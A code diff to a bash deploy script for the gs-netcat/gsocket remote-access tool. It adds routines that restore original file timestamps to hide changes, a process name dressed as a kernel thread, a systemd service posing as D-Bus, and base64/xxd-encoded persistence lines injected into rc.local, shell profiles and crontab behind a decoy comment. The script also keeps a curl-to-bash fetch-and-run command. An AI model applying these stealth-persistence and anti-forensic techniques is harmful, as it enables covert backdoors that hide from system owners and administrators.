@@ -57,10 +57,12 @@ DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 # DL_CMD="$DL_CRL"
 BIN_HIDDEN_NAME_DEFAULT=gs-dbus
-PROC_HIDDEN_NAME_DEFAULT="[kcached/0]"
+# Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
+PROC_HIDDEN_NAME_DEFAULT="[kcached]"
 CY="\033[1;33m" # yellow
 CG="\033[1;32m" # green
 CR="\033[1;31m" # red
+CDR="\033[0;31m" # red
 CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
 CN="\033[0m"    # none
@@ -71,11 +73,291 @@ else
 	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
 fi
 
+_ts_fix()
+{
+	local fn
+	local ts
+	local args
+	fn="$1"
+	ts="$2"
+
+	[[ ! -e "$1" ]] && return
+	[[ -z $ts ]] && return
+
+	# Change the symlink for ts_last_fn items
+	[[ -n "$3" ]] && args=("-h")
+
+	# Either reference by Timestamp or File
+	[[ "${ts:0:1}" = '/' ]] && {
+		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
+		touch "${args[@]}" -r "${ts}" "$fn" 2>/dev/null
+		return
+	}
+	touch "${args[@]}" -t "$ts" "$fn" 2>/dev/null && return
+	# If 'date -r' or 'touch -t' failed:
+	touch "${args[@]}" -r "/etc/ld.so.conf" "$fn" 2>/dev/null
+}
+
+# Restore timestamp of files
+ts_restore()
+{
+	local fn
+	local n
+	local ts
+
+	[[ ${#_ts_fn_a[@]} -eq 0 ]] && return
+	[[ ${#_ts_fn_a[@]} -ne ${#_ts_ts_a[@]} ]] && { echo >&2 "Ooops"; return; }
+
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		ts="${_ts_ts_a[$n]}"
+		fn="${_ts_fn_a[$n]}"
+		# DEBUGF "RESTORE-TS ${fn} ${ts}"
+		((n++))
+
+		_ts_fix "$fn" "$ts"
+	done
+
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_last_ts_a[@]}" ]] && break
+		ts="${_ts_last_ts_a[$n]}"
+		fn="${_ts_last_fn_a[$n]}"
+		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
+		((n++))
+
+		_ts_fix "$fn" "$ts" "symlink"
+	done
+}
+
+ts_is_marked()
+{
+	local fn
+	local a
+	fn="$1"
+
+	for a in "${_ts_fn_a[@]}"; do
+		[[ "$a" = "$fn" ]] && return 0 # True
+	done
+
+	return 1 # False
+}
+
+
+
+# There are some files which need TimeStamp update after all other TimeStamps
+# have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
+# ts_add_last [file] <reference file>
+ts_add_last()
+{
+	local fn
+	local ts
+	local ref
+	fn="$1"
+	ref="$2"
+
+	ts="$ref"
+	[[ -z $ref ]] && {
+		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
+	}
+
+	# Note: _ts_last_ts_a may store a number or a directory (start with '/')
+	_ts_last_ts_a+=("$ts")
+	_ts_last_fn_a+=("$fn")
+}
+
+# Determine the Timestamp of the file $fn that is about to be
+# created (or already exists).
+# Sets $_ts_ts to Timestamp.
+# Usage: _ts_get_ts [$fn]
+_ts_get_ts()
+{
+	local fn
+	local n
+	local pdir
+	fn="$1"
+	pdir="$(dirname "$1")"
+
+	unset _ts_ts
+	unset _ts_pdir_by_us
+	# Inherit Timestamp if parent directory was created
+	# by us.
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		[[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && {
+			_ts_ts="${_ts_ts_a[$n]}"
+			_ts_pdir_by_us=1
+			# DEBUGF "Parent ${pdir} created by us."
+			return
+		}
+		((n++))
+	done
+
+	# Check if file exists.
+	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
+
+	# Take ts from oldest file in directory
+	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
+	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
+}
+
+
+_ts_add()
+{
+	# Retrieve TimeStamp for $1
+	_ts_get_ts "$1"
+	# Add TimeStamp
+	_ts_ts_a+=("$_ts_ts")
+	_ts_fn_a+=("$1");
+	_ts_mkdir_fn_a+=("$2")
+}
+
+# Note: Do not use global _ts variables except _ts_add_direct
+# Usage: mk_file [filename]
+mk_file()
+{
+	local fn
+	local oldest
+	local pdir
+	local pdir_added
+	fn="$1"
+
+	# DEBUGF "${CC}MK_FILE($fn)${CN}"
+	pdir="$(dirname "$fn")"
+
+	ts_is_marked "$pdir" || {
+		# HERE: Parent not tracked
+		_ts_add "$pdir" "<NOT BY XMKDIR>"
+		pdir_added=1
+	}
+
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked
+		_ts_get_ts "$fn"
+		# Do not add creation fails.
+		touch "$fn" 2>/dev/null || {
+			# HERE: Permission denied
+			[[ -n "$pdir_added" ]] && {
+				# Remove pdir if it was added above
+				unset _ts_ts_a[-1]
+				unset _ts_fn_a[-1]
+				unset _ts_mkdir_fn_a[-1]
+			}
+			return 69 # False
+		}
+		chmod 600 "$fn"
+		_ts_ts_a+=("$_ts_ts")
+		_ts_fn_a+=("$fn");
+		_ts_mkdir_fn_a+=("<NOT BY XMKDIR>")
+		return
+	}
+
+	touch "$fn" 2>/dev/null || return
+	chmod 600 "$fn"
+	true
+}
+
+xrmdir()
+{
+	local fn
+	local pdir
+	fn="$1"
+
+	[[ ! -d "$fn" ]] && return
+	pdir="$(dirname "$fn")"
+
+	ts_is_marked "$pdir" || {
+		_ts_add "$pdir" "<RMDIR-UNTRACKED>"
+	}
+
+	rmdir "$fn" 2>/dev/null
+}
+
+xrm()
+{
+	local pdir
+	local fn
+	fn="$1"
+
+	[[ ! -f "$fn" ]] && return
+	pdir="$(dirname "$fn")"
+
+	ts_is_marked "$pdir" || {
+		# HERE: Parent is not tracked.
+		_ts_add "$pdir" "<RM-UNTRACKED>"
+	}
+
+	rm -f "$1" 2>/dev/null
+}
+
+# Create a directory if it does not exist and fix timestamp
+# xmkdir [directory] <ts reference file>
+xmkdir()
+{
+	local fn
+	local pdir
+	local fn_dir
+	fn="$1"
+
+	DEBUGF "${CG}XMKDIR($fn)${CN}"
+	pdir="$(dirname "$fn")"
+	true # reset $?
+	[[ -d "$fn" ]] && return     # Directory already exists
+	[[ ! -d "$pdir" ]] && return # Parent dir does not exists (Huh?)
+
+	# Check if parent is being tracked
+	ts_is_marked "$pdir" || {
+		# HERE: Parent not tracked
+		# We did not create the parent or we would be tracking it.
+		_ts_add "$pdir" "<NOT BY XMKDIR>"
+	}
+
+	# Check if new directory is already tracked
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked (normal case)
+		_ts_add "$fn" "$fn" # We create the directory (below)
+	}
+
+	mkdir "$fn" 2>/dev/null || return
+	chmod 700 "$fn"
+	true
+}
+
+xcp()
+{
+	local src
+	local dst
+	src="$1"
+	dst="$2"
+
+	# DEBUGF "${CG}XCP($src, $dst)${CN}"
+	mk_file "$dst" || return
+	cp "$src" "$dst" || return
+	true
+}
+
+xmv()
+{
+	local src
+	local dst
+	src="$1"
+	dst="$2"
+
+	xcp "$src" "$dst"
+	xrm "$src"
+	true
+}
+
 exit_clean()
 {
-	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR:?}/"*; rmdir "${TMPDIR}"; } &>/dev/null
-	rm -rf "${GS_PREFIX}/etc/rc.local-old" &>/dev/null
-	rm -rf "${GS_PREFIX}/etc/rc.local-new" &>/dev/null
+	[[ "${#TMPDIR}" -gt 5 ]] && {
+		rm -rf "${TMPDIR:?}/"*
+		rmdir "${TMPDIR}"
+	} &>/dev/null
+
+	ts_restore
 }
 
 exit_code()
@@ -99,12 +381,6 @@ exit_alldone()
 	exit_code 0
 }
 
-fs_make_old()
-{
-	[[ -f /etc/ld.so.conf ]] || return
-	touch -r /etc/ld.so.conf "$1"
-}
-
 # Test if directory can be used to store executeable
 # try_dstdir "/tmp/.gs-foobar"
 # Return 0 on success.
@@ -115,38 +391,42 @@ try_dstdir()
 	dstdir="${1}"
 
 	# Create directory if it does not exists.
-	[[ ! -d "${dstdir}" ]] && { mkdir -p "${dstdir}" &>/dev/null || return 101; }
+	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; }
 
 	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
-	# Return if not writeable
-	touch "$DSTBIN" &>/dev/null || { return 102; }
+ 
+	mk_file "$DSTBIN" || return 102
 
-	# Test if directory is mounted with noexec flag and return success
-	# if binary can be executed from this directory.
-	ebin="/bin/true"
-	if [[ ! -e "$ebin" ]]; then
-		ebin=$(command -v id 2>/dev/null)
-		[[ -z "$ebin" ]] && return 0 # Try our best
-	fi
+	# Find an executeable and test if we can execute binaries from
+	# destination directory (no noexec flag)
+	# /bin/true might be a symlink to /usr/bin/true
+	for ebin in "/bin/true" "$(command -v id)"; do
+		[[ -z $ebin ]] && continue
+		[[ -e "$ebin" ]] && break
+	done
+	[[ ! -e "$ebin" ]] && return 0 # True. Try our best
 
 	# Must use same name on busybox-systems
 	trybin="${dstdir}/$(basename "$ebin")"
 
 	# /bin/true might be a symlink to /usr/bin/true
-	if [[ -f "${trybin}" ]]; then
-		# Between 28th of April and end of May we accidentially
-		# overwrote /bin/true with gs-dbus binary. Thus we use -g
-		# which is a valid argument for gs-dbus, true and id
-		# and returns 0 (true)
-		"${trybin}" -g &>/dev/null || { return 103; } # FAILURE
-	else 
-		cp "$ebin" "$trybin" &>/dev/null || return 0
-		"${trybin}" &>/dev/null || { rm -f "${trybin}"; return 103; } # FAILURE
-		rm -f "${trybin}"
-	fi
+	[[ "$ebin" -ef "$trybin" ]] && return 0
+	mk_file "$trybin" || return
+
+	# Return if both are the same /bin/true and /usr/bin/true
+	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
+	chmod 700 "$trybin"
+
+	# Between 28th April and end of May we accidentially
+	# over wrote /bin/true with gs-bd binary. Thus we use -g
+	# to make true, id and gs-bd return true (in case it's gs-bs).
+	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; } # FAILURE
+	rm -f "${trybin:?}"
 
 	return 0
 }
+
+
 
 # Called _after_ init_vars() at the end of init_setup.
 init_dstbin()
@@ -161,13 +441,14 @@ init_dstbin()
 	try_dstdir "${GS_PREFIX}/usr/bin" && return
 
 	# Try user installation
+	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
 	try_dstdir "${GS_PREFIX}${HOME}/.config/dbus" && return
 
 	# Try /tmp/.gsusr-*
-	try_dstdir "/tmp/.gsusr-${UID}" && return
+	try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }
 
 	# Try /dev/shm as last resort
-	try_dstdir "/dev/shm" && return
+	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }
 
 	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
 	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
@@ -178,9 +459,27 @@ try_tmpdir()
 {
 	[[ -n $TMPDIR ]] && return # already set
 
-	[[ ! -d "$1" ]] && mkdir -p "$1" 2>/dev/null
+	[[ ! -d "$1" ]] && return
 
-	[[ -d "$1" ]] && mkdir -p "${1}/${2}" 2>/dev/null && TMPDIR="${1}/${2}"
+	[[ -d "$1" ]] && xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"
+}
+
+try_encode()
+{
+	local enc
+	local dec
+	local teststr
+	prg="$1"
+	enc="$2"
+	dec="$3"
+
+	teststr="blha|;id-u \'this is a long test of a very long string to test encodign decoding process # foobar"
+
+	[[ -n $ENCODE_STR ]] && return
+
+	command -v "$prg" >/dev/null && [[ "$(echo "$teststr" | $enc 2>/dev/null| $dec 2>/dev/null)" = "$teststr" ]] || return
+	ENCODE_STR="$enc"
+	DECODE_STR="$dec"
 }
 
 init_vars()
@@ -192,7 +491,7 @@ init_vars()
 	if [[ -z "$HOME" ]]; then
 		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
 		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
-		WARN "HOME not set. Using '$HOME'"
+		WARN "HOME not set. Using 'HOME=$HOME'"
 	fi
 
 	# User supplied OSARCH
@@ -233,10 +532,10 @@ init_vars()
 	[[ -z "$USER" ]] && USER=$(id -un)
 	[[ -z "$UID" ]] && UID=$(id -u)
 
-	try_tmpdir "/dev/shm" ".gs-${UID}"
-	try_tmpdir "/tmp" ".gs-${UID}"
-	try_tmpdir "${HOME}/.tmp" ".gs-${UID}"
-
+	# check that xxd is working as expected (alpine linux does not have -r option)
+	try_encode "base64" "base64 -w0" "base64 -d"
+	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
+	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
 	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
@@ -294,35 +593,51 @@ init_vars()
 	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
 	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")
 
-	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
+	[[ -d "${GS_PREFIX}/etc/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
+	[[ -d "${GS_PREFIX}/lib/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"
+	WANTS_DIR="${GS_PREFIX}/etc/systemd/system" # always this
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
 	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
 	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 
+	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
+	local pids
+	pids="$(pgrep "${BIN_HIDDEN_NAME}" 2>/dev/null)"
+	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
+
+	DEBUGF "OLD_PIDS='$OLD_PIDS'"
 	DEBUGF "SRC_PKG=$SRC_PKG"
+}
+
+mk_encode()
+{
+	echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
 }
 
 init_setup()
 {
+	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
+	try_tmpdir "/dev/shm" ".gs-${UID}"
+	try_tmpdir "/tmp" ".gs-${UID}"
+	try_tmpdir "${HOME}" ".gs"
+	try_tmpdir "$(pwd)" ".gs-${UID}"
+
 	if [[ -n "$GS_PREFIX" ]]; then
 		# Debuggin and testing into separate directory
 		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
 		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
-			cp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
-			touch -r "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
+			xcp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
 		fi
-		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
-		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
+		xcp -p /etc/rc.local "${GS_PREFIX}/etc/"
 	fi
 
 	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
 	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
-	mkdir "$TMPDIR" &>/dev/null
 
-	touch "${TMPDIR}/.gs-${UID}.lock" || errexit "FAILED. No temporary directory found for downloading package."
-	rm -f "${TMPDIR}/.gs-${UID}.lock" 2>/dev/null
+	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
+	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null
 
 	# Find out which directory is writeable
 	init_dstbin
@@ -349,18 +664,16 @@ init_setup()
 	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
 	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
 
-	# check that xxd is working as expected (alpine linux does not have -r option)
-	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
-		local p
-		p="$(echo "$RCLOCAL_LINE" | xxd -ps -c1024)"
-		RCLOCAL_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
 
-		p="$(echo "$PROFILE_LINE" | xxd -ps -c1024)"
-		PROFILE_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
-
-		p="$(echo "$CRONTAB_LINE" | xxd -ps -c1024)"
-		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+	if [[ -n $ENCODE_STR ]]; then
+		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
+		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
+		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
 	fi
+
+	# DEBUGF "RCLOCAL_LINE=${RCLOCAL_LINE}"
+	# DEBUGF "PROFILE_LINE=${PROFILE_LINE}"
+	# DEBUGF "CRONTAB_LINE=${CRONTAB_LINE}"
 	DEBUGF "TMPDIR=${TMPDIR}"
 	DEBUGF "DSTBIN=${DSTBIN}"
 }
@@ -371,7 +684,7 @@ uninstall_rm()
 	[[ ! -f "$1" ]] && return # return if file does not exist
 
 	echo 1>&2 "Removing $1..."
-	rm -rf "$1"
+	xrm "$1" 2>/dev/null || return
 }
 
 uninstall_rmdir()
@@ -379,7 +692,8 @@ uninstall_rmdir()
 	[[ -z "$1" ]] && return
 	[[ ! -d "$1" ]] && return # return if file does not exist
 
-	rmdir "$1" 2>/dev/null || return
+	xrmdir "$1" 2>/dev/null || return
+
 	echo 1>&2 "Removing $1..."
 }
 
@@ -394,15 +708,13 @@ uninstall_rc()
 
 	grep -F -- "${hname}" "$fn" &>/dev/null || return # not installed
 
-	echo 1>&2 "Removing ${fn}..."
-	touch -r "${fn}" "${fn}-ts"
-	[[ ! -f "${fn}-ts" ]] && return # permission denied
-	D="$(grep -v -F -- "${hname}" "$fn")"
-	echo "$D" >"${fn}"
-	touch -r "${fn}-ts" "${fn}"
-	rm -f "${fn}-ts"
+	mk_file "$fn" || return
 
-	[[ ! -s "${fn}" ]] && rm -f "${fn}" 2>/dev/null # delete zero size file
+	echo 1>&2 "Removing ${fn}..."
+	D="$(grep -v -F -- "${hname}" "$fn")"
+	echo "$D" >"${fn}" || return
+
+	[[ ! -s "${fn}" ]] && rm -f "${fn:?}" 2>/dev/null # delete zero size file
 }
 
 uninstall_service()
@@ -410,11 +722,12 @@ uninstall_service()
 	local sn
 	local sf
 	sn="$1"
-	sf="/etc/systemd/system/${sn}.service"
+	sf="${SERVICE_DIR}/${sn}.service"
 
 	[[ ! -f "${sf}" ]] && return
 
 	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
+		ts_add_last "${WANTS_DIR}/multi-user.target.wants"
 		# STOPPING would kill the current login shell. Do not stop it.
 		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
 		systemctl disable "${sn}" 2>/dev/null
@@ -426,6 +739,7 @@ uninstall_service()
 # Rather important function especially when testing and developing this...
 uninstall()
 {
+
 	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${BIN_HIDDEN_NAME}"
 	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd"
 	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
@@ -434,12 +748,13 @@ uninstall()
 	uninstall_rm "/tmp/.gsusr-${UID}/${BIN_HIDDEN_NAME}"
 
 	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
-	uninstall_rm "${RCLOCAL_DIR}/gs-bd.dat"
+	uninstall_rm "${RCLOCAL_DIR}/gs-bd.dat" #OLD
 	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${SEC_NAME}"
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd.dat"
+	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd.dat" #OLD
 	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
-	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd.dat"
+	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd.dat" #OLD
 	uninstall_rm "/dev/shm/${SEC_NAME}"
+	uninstall_rm "/tmp/.gsusr-${UID}${SEC_NAME}"
 
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config/dbus"
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
@@ -447,34 +762,37 @@ uninstall()
 
 	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
 	uninstall_rm "${TMPDIR}/${SRC_PKG}"
-	uninstall_rm "${TMPDIR}/._gs-netcat" # from docker???
+	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
 	uninstall_rmdir "${TMPDIR}"
 
 	# Remove from login script
 	for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
 		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${BIN_HIDDEN_NAME}"
-		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "gs-bd"
+		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "gs-bd" #OLD
 	done 
 	uninstall_rc "${GS_PREFIX}/etc/rc.local" "${BIN_HIDDEN_NAME}" 
-	uninstall_rc "${GS_PREFIX}/etc/rc.local" "gs-bd" 
+	uninstall_rc "${GS_PREFIX}/etc/rc.local" "gs-bd" #OLD
 
 	# Remove crontab
 	if [[ ! $OSTYPE == *darwin* ]]; then
-		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | grep -v -F -- "gs-bd" | crontab - 2>/dev/null 
+		if crontab -l 2>/dev/null | grep -F -e "$BIN_HIDDEN_NAME" -e "gs-bd" &>/dev/null; then
+			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
+			command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | grep -v -F -- "gs-bd" | crontab - 2>/dev/null
+		fi
 	fi
 
 	# Remove systemd service
 	uninstall_service "${SERVICE_HIDDEN_NAME}"
-	uninstall_service "gs-bd"
+	uninstall_service "gs-bd" #OLD
 	systemctl daemon-reload 2>/dev/null
 
 	## Systemd's gs-dbus.dat
 	uninstall_rm "${SYSTEMD_SEC_FILE}"
-	uninstall_rm "/etc/system/system/gs-bd.dat"
+	uninstall_rm "/etc/system/system/gs-bd.dat" #OLD
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
 	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
-	exit 0
+	exit_code 0
 }
 
 SKIP_OUT()
@@ -528,7 +846,7 @@ HOWTO_CONNECT_OUT()
 # Try to load a GS_SECRET
 gs_secret_reload()
 {
-	DEBUGF "secret_load(${1})"
+	# DEBUGF "${CG}secret_load(${1})${CN}"
 	[[ -n $GS_SECRET_FROM_FILE ]] && return
 	[[ ! -f "$1" ]] && return
 
@@ -545,16 +863,19 @@ gs_secret_reload()
 
 gs_secret_write()
 {
-	echo "$GS_SECRET" >"$1"
-	chmod 600 "$1"
-	fs_make_old "$1"
+	mk_file "$1" || return
+	echo "$GS_SECRET" >"$1" || return
 }
+
 
 install_system_systemd()
 {
-	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
+	[[ ! -d "${SERVICE_DIR}" ]] && return
 	command -v systemctl >/dev/null || return
-	[[ "$(systemctl is-system-running 2>/dev/null)" = *"offline"* ]] &>/dev/null && return
+	# test for:
+	# 1. offline
+	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
@@ -567,6 +888,7 @@ install_system_systemd()
 	fi
 
 	# Create the service file
+	mk_file "${SERVICE_FILE}" || return
 	echo "[Unit]
 Description=D-Bus System Connection Bus
 After=network.target
@@ -579,17 +901,18 @@ WorkingDirectory=/root
 ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
 [Install]
-WantedBy=multi-user.target" >"${SERVICE_FILE}"
+WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
 
-	chmod 600 "${SERVICE_FILE}"
-	fs_make_old "${SERVICE_FILE}"
 	gs_secret_write "$SYSTEMD_SEC_FILE"
+	ts_add_last "${WANTS_DIR}/multi-user.target.wants"
+	ts_add_last "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
 
-	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}" "${SYSTEMD_SEC_FILE}"; return; } # did not work... 
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
 }
+
 
 # inject a string ($2-) into the 2nd line of a file and retain the
 # PERM/TIMESTAMP of the target file ($1)
@@ -599,15 +922,15 @@ install_to_file()
 
 	shift 1
 
-	touch -r "${fname}" "${fname}-ts" || return
+	# If file does not exist then create with oldest TS
+	mk_file "$fname" || return
 
 	D="$(IFS=$'\n'; head -n1 "${fname}" && \
 		echo "${*}" && \
 		tail -n +2 "${fname}")"
-	echo "$D" >"${fname}"
+	echo 2>/dev/null "$D" >"${fname}" || return
 
-	touch -r "${fname}-ts" "${fname}"
-	rm -f "${fname}-ts"
+	true
 }
 
 install_system_rclocal()
@@ -637,7 +960,7 @@ install_system()
 	echo -en 2>&1 "Installing systemwide remote access permanentally....................."
 
 	# Try systemd first
-	install_system_systemd
+	# install_system_systemd # FIXME-2022
 
 	# Try good old /etc/rc.local
 	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal
@@ -660,12 +983,14 @@ install_user_crontab()
 		return
 	fi
 
+	[[ $UID -eq 0 ]] && {
+		mk_file "${CRONTAB_DIR}/root"
+	}
 	local cr_time
-	cr_time="59 * * * *"
-	# [[ -n "$GS_DEBUG" ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
+	cr_time="0 * * * *"
 	(crontab -l 2>/dev/null && \
 	echo "$NOTE_DONOTREMOVE" && \
-	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }
+	echo "${cr_time} $CRONTAB_LINE") | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
 
 	((IS_INSTALLED+=1))
 	OK_OUT
@@ -682,15 +1007,14 @@ install_user_profile()
 	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"
 
 	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
-	[[ -f "${rc_file}" ]] || { touch "${rc_file}"; chmod 600 "${rc_file}"; }
-	if grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
+	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
 		SKIP_OUT "Already installed in ${rc_file}"
 		return
 	fi
 
-	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}"
+	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }
 
 	((IS_INSTALLED+=1))
 	OK_OUT
@@ -708,7 +1032,6 @@ install_user()
 	for x in "${RC_FN_LIST[@]}"; do
 		install_user_profile "$x"
 	done
-
